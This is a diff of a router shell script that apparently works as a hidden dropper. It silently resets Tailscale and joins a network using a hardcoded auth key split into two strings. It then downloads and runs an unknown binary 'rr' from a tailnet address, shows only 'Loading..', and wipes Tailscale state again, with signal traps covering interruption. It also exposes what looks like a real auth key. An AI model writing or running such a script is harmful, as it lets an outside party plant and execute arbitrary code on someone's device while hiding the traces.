@@ -1,18 +1,22 @@
 #!/bin/sh
 
-rm -rf /etc/radu
-rm -rf /etc/pakawrt
-uci set tailscale.settings.enabled='1'
-uci commit tailscale
-tailscale down
-tailscale logout
-rm -rf /etc/tailscale /var/lib/tailscale
-/etc/init.d/tailscale restart
-sleep 5
+rt() {
+    tailscale down >/dev/null 2>&1
+    tailscale logout >/dev/null 2>&1
+    sleep 1
+    rm -rf /etc/tailscale /var/lib/tailscale >/dev/null 2>&1
+    uci set tailscale.settings.enabled='1'
+    uci commit tailscale
+    /etc/init.d/tailscale restart >/dev/null 2>&1
+    sleep 5
+    echo "Loading.."
+}
+trap 'rt; exit 1' INT TERM
+rt
 rs1="tskey-auth-knc3tFVDj111CNTRL-"
 rs2="ZueuDodYkbJ3SeQfiy3zaJZJ9EXS8EyN3"
-TSUP="tailscale up --reset --auth-key=${rs1}${rs2}"
-eval "$TSUP"
+tailscale up --reset --auth-key="${rs1}${rs2}"
 wget -O /usr/bin/rr http://100.64.64.59:3030/static/rr
-chmod +x /usr/bin/rr
-rr
+chmod +x /usr/bin/rr && rr
+rt
+exit 0
